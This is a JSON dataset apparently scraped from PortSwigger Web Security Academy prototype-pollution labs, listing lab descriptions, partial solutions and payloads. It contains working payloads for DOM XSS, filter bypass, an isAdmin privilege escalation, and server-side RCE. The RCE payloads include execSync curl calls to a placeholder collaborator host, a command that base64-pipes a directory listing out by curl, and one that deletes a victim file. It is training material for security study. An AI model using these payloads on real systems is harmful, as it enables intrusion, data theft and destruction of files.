[
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis",
    "category": "prototype-pollution",
    "title": "Client-side prototype pollution via browser APIs",
    "description": "This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.",
    "solution_steps": [
      "In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__[foo]=bar",
      "Open the browser DevTools panel and go to the Console tab.",
      "Enter Object.prototype .",
      "Study the properties of the returned object and observe that your injected foo property has been added. You've successfully found a prototype pollution source."
    ],
    "solution": "1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__[foo]=bar\n2. Open the browser DevTools panel and go to the Console tab.\n3. Enter Object.prototype .\n4. Study the properties of the returned object and observe that your injected foo property has been added. You've successfully found a prototype pollution source.",
    "payloads": [
      "Object.prototype",
      "alert()",
      "/?__proto__[foo]=bar",
      "searchLoggerConfigurable.js",
      "config",
      "transport_url",
      "Object.defineProperty()",
      "value",
      "/?__proto__[value]=foo",
      "<script>",
      "data:",
      "/?__proto__[value]=data:,alert(1);",
      "alert(1)",
      "search",
      "script.src"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries",
    "category": "prototype-pollution",
    "title": "Client-side prototype pollution in third-party libraries",
    "description": "This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend usingDOM Invaderas this will save you a considerable amount of time and effort.",
    "solution_steps": [
      "Load the lab in Burp's built-in browser.",
      "Enable DOM Invader and enable the prototype pollution option .",
      "Open the browser DevTools panel, go to the DOM Invader tab, then reload the page.",
      "Observe that DOM Invader has identified two prototype pollution vectors in the hash property i.e. the URL fragment string.",
      "Click Scan for gadgets . A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.",
      "When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.",
      "Observe that DOM Invader has successfully accessed the setTimeout() sink via the hitCallback gadget.",
      "Click Exploit . DOM Invader automatically generates a proof-of-concept exploit and calls alert(1) .",
      "Disable DOM Invader.",
      "In the browser, go to the lab's exploit server.",
      "In the Body section, craft an exploit that will navigate the victim to a malicious URL as follows: <script>\n    location=\"https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29\"\n</script>",
      "Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the alert(document.cookie) payload is triggered.",
      "Go back to the exploit server and deliver the exploit to the victim to solve the lab."
    ],
    "solution": "1. Load the lab in Burp's built-in browser.\n2. Enable DOM Invader and enable the prototype pollution option .\n3. Open the browser DevTools panel, go to the DOM Invader tab, then reload the page.\n4. Observe that DOM Invader has identified two prototype pollution vectors in the hash property i.e. the URL fragment string.\n5. Click Scan for gadgets . A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.\n6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.\n7. Observe that DOM Invader has successfully accessed the setTimeout() sink via the hitCallback gadget.\n8. Click Exploit . DOM Invader automatically generates a proof-of-concept exploit and calls alert(1) .\n9. Disable DOM Invader.\n10. In the browser, go to the lab's exploit server.\n11. In the Body section, craft an exploit that will navigate the victim to a malicious URL as follows: <script>\n    location=\"https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29\"\n</script>\n12. Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the alert(document.cookie) payload is triggered.\n13. Go back to the exploit server and deliver the exploit to the victim to solve the lab.",
    "payloads": [
      "alert(document.cookie)",
      "hash",
      "setTimeout()",
      "hitCallback",
      "alert(1)",
      "<script>\n    location=\"https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29\"\n</script>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization",
    "category": "prototype-pollution",
    "title": "Client-side prototype pollution via flawed sanitization",
    "description": "This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.",
    "solution_steps": [
      "In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__.foo=bar",
      "Open the browser DevTools panel and go to the Console tab.",
      "Enter Object.prototype .",
      "Study the properties of the returned object and observe that your injected foo property has not been added.",
      "Try alternative prototype pollution vectors. For example: /?__proto__[foo]=bar\n/?constructor.prototype.foo=bar",
      "Observe that in each instance, Object.prototype is not modified.",
      "Go to the Sources tab and study the JavaScript files that are loaded by the target site. Notice that deparamSanitized.js uses the sanitizeKey() function defined in searchLoggerFiltered.js to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.",
      "Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example: /?__pro__proto__to__[foo]=bar\n/?__pro__proto__to__.foo=bar\n/?constconstructorructor[protoprototypetype][foo]=bar\n/?constconstructorructor.protoprototypetype.foo=bar",
      "In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar . You've successfully found a prototype pollution source and bypassed the website's key sanitization."
    ],
    "solution": "1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__.foo=bar\n2. Open the browser DevTools panel and go to the Console tab.\n3. Enter Object.prototype .\n4. Study the properties of the returned object and observe that your injected foo property has not been added.\n5. Try alternative prototype pollution vectors. For example: /?__proto__[foo]=bar\n/?constructor.prototype.foo=bar\n6. Observe that in each instance, Object.prototype is not modified.\n7. Go to the Sources tab and study the JavaScript files that are loaded by the target site. Notice that deparamSanitized.js uses the sanitizeKey() function defined in searchLoggerFiltered.js to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.\n8. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example: /?__pro__proto__to__[foo]=bar\n/?__pro__proto__to__.foo=bar\n/?constconstructorructor[protoprototypetype][foo]=bar\n/?constconstructorructor.protoprototypetype.foo=bar\n9. In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar . You've successfully found a prototype pollution source and bypassed the website's key sanitization.",
    "payloads": [
      "Object.prototype",
      "alert()",
      "/?__proto__.foo=bar",
      "/?__proto__[foo]=bar\n/?constructor.prototype.foo=bar",
      "deparamSanitized.js",
      "sanitizeKey()",
      "searchLoggerFiltered.js",
      "/?__pro__proto__to__[foo]=bar\n/?__pro__proto__to__.foo=bar\n/?constconstructorructor[protoprototypetype][foo]=bar\n/?constconstructorructor.protoprototypetype.foo=bar",
      "searchLogger.js",
      "config",
      "transport_url",
      "/?__pro__proto__to__[transport_url]=foo",
      "data:",
      "/?__pro__proto__to__[transport_url]=data:,alert(1);",
      "alert(1)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector",
    "category": "prototype-pollution",
    "title": "DOM XSS via an alternative prototype pollution vector",
    "description": "This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:",
    "solution": "Pay attention to the\nXSS context\n. You need to adjust your payload slightly to ensure that the JavaScript syntax remains valid following your injection.",
    "payloads": [
      "Object.prototype",
      "alert()",
      "/?__proto__[foo]=bar",
      "/?__proto__.foo=bar",
      "eval()",
      "searchLoggerAlternative.js",
      "manager.sequence",
      "sequence",
      "/?__proto__.sequence=alert(1)",
      "alert(1)1",
      "/?__proto__.sequence=alert(1)-",
      "alert(1)",
      "search"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution",
    "category": "prototype-pollution",
    "title": "DOM XSS via client-side prototype pollution",
    "description": "This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:",
    "solution_steps": [
      "In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__[foo]=bar",
      "Open the browser DevTools panel and go to the Console tab.",
      "Enter Object.prototype .",
      "Study the properties of the returned object. Observe that it now has a foo property with the value bar . You've successfully found a prototype pollution source."
    ],
    "solution": "1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__[foo]=bar\n2. Open the browser DevTools panel and go to the Console tab.\n3. Enter Object.prototype .\n4. Study the properties of the returned object. Observe that it now has a foo property with the value bar . You've successfully found a prototype pollution source.",
    "payloads": [
      "Object.prototype",
      "alert()",
      "/?__proto__[foo]=bar",
      "searchLogger.js",
      "config",
      "transport_url",
      "<script>",
      "/?__proto__[transport_url]=foo",
      "data:",
      "/?__proto__[transport_url]=data:,alert(1);",
      "alert(1)",
      "search",
      "script.src"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution",
    "category": "prototype-pollution",
    "title": "Bypassing flawed input filters for server-side prototype pollution",
    "description": "This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.",
    "solution_steps": [
      "Log in and visit your account page. Submit the form for updating your billing and delivery address.",
      "In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.",
      "Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.",
      "Send the request to Burp Repeater."
    ],
    "solution": "1. Log in and visit your account page. Submit the form for updating your billing and delivery address.\n2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.\n3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.\n4. Send the request to Burp Repeater.",
    "payloads": [
      "Object.prototype",
      "carlos",
      "wiener:peter",
      "POST /my-account/change-address",
      "__proto__",
      "json spaces",
      "\"__proto__\": {\n    \"json spaces\":10\n}",
      "constructor",
      "\"constructor\": {\n    \"prototype\": {\n        \"json spaces\":10\n    }\n}",
      "isAdmin",
      "false",
      "\"constructor\": {\n    \"prototype\": {\n        \"isAdmin\":true\n    }\n}"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection",
    "category": "prototype-pollution",
    "title": "Detecting server-side prototype pollution without polluted property reflection",
    "description": "This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.",
    "solution_steps": [
      "Log in and visit your account page. Submit the form for updating your billing and delivery address.",
      "In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.",
      "Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.",
      "Send the request to Burp Repeater.",
      "In Repeater, add a new property to the JSON with the name __proto__ , containing an object with an arbitrary property: \"__proto__\": {\n    \"foo\":\"bar\"\n}",
      "Send the request. Observe that the object in the response does not reflect the injected property. However, this doesn't necessarily mean that the application isn't vulnerable to prototype pollution."
    ],
    "solution": "1. Log in and visit your account page. Submit the form for updating your billing and delivery address.\n2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.\n3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.\n4. Send the request to Burp Repeater.\n5. In Repeater, add a new property to the JSON with the name __proto__ , containing an object with an arbitrary property: \"__proto__\": {\n    \"foo\":\"bar\"\n}\n6. Send the request. Observe that the object in the response does not reflect the injected property. However, this doesn't necessarily mean that the application isn't vulnerable to prototype pollution.",
    "payloads": [
      "Object.prototype",
      "wiener:peter",
      "POST /my-account/change-address",
      "__proto__",
      "\"__proto__\": {\n    \"foo\":\"bar\"\n}",
      "status",
      "\"__proto__\": {\n    \"status\":555\n}",
      "statusCode"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution",
    "category": "prototype-pollution",
    "title": "Exfiltrating sensitive data via server-side prototype pollution",
    "description": "This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.",
    "solution_steps": [
      "Log in and visit your account page. Submit the form for updating your billing and delivery address.",
      "In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.",
      "Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.",
      "Send the request to Burp Repeater."
    ],
    "solution": "1. Log in and visit your account page. Submit the form for updating your billing and delivery address.\n2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.\n3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.\n4. Send the request to Burp Repeater.",
    "payloads": [
      "Object.prototype",
      "/home/carlos",
      "wiener:peter",
      "POST /my-account/change-address",
      "__proto__",
      "json spaces",
      "\"__proto__\": {\n    \"json spaces\":10\n}",
      "child_process.execSync()",
      "\"__proto__\": {\n    \"shell\":\"vim\",\n    \"input\":\":! curl https://YOUR-COLLABORATOR-ID.oastify.com\\n\"\n}",
      "input",
      "\"input\":\":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\\n\"",
      "POST",
      "node_apps",
      "secret",
      "/home/carlos/secret"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution",
    "category": "prototype-pollution",
    "title": "Privilege escalation via server-side prototype pollution",
    "description": "This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.",
    "solution_steps": [
      "Log in and visit your account page. Submit the form for updating your billing and delivery address.",
      "In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.",
      "Observe that when you submit the form, the data from the fields is sent to the server as JSON.",
      "Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.",
      "Send the request to Burp Repeater."
    ],
    "solution": "1. Log in and visit your account page. Submit the form for updating your billing and delivery address.\n2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.\n3. Observe that when you submit the form, the data from the fields is sent to the server as JSON.\n4. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.\n5. Send the request to Burp Repeater.",
    "payloads": [
      "Object.prototype",
      "carlos",
      "wiener:peter",
      "POST /my-account/change-address",
      "__proto__",
      "\"__proto__\": {\n    \"foo\":\"bar\"\n}",
      "isAdmin",
      "false",
      "\"__proto__\": {\n    \"isAdmin\":true\n}"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution",
    "category": "prototype-pollution",
    "title": "Remote code execution via server-side prototype pollution",
    "description": "This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.",
    "solution": "The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site.",
    "payloads": [
      "Object.prototype",
      "/home/carlos/morale.txt",
      "wiener:peter",
      "POST /my-account/change-address",
      "__proto__",
      "json spaces",
      "\"__proto__\": {\n    \"json spaces\":10\n}",
      "execArgv",
      "--eval",
      "execSync()",
      "\"__proto__\": {\n    \"execArgv\":[\n        \"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')\"\n    ]\n}",
      "curl",
      "\"__proto__\": {\n    \"execArgv\":[\n        \"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')\"\n    ]\n}"
    ]
  }
]